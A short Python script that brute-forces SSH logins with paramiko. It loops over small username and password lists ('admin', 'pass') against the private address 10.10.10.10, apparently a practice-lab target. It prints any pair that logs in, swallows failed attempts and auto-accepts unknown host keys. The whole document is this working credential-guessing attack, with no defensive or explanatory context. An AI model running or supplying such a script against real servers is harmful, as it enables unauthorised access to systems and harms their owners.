import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
username_list = ["admin", "pass"]
pass_list = ["admin", "pass"]

for i in username_list:
    for j in pass_list:
        try:
            result = client.connect("10.10.10.10", username = i, password= j)
            client.close()
            print("username: ", i,"\npassword: ", j)
        except:
            pass









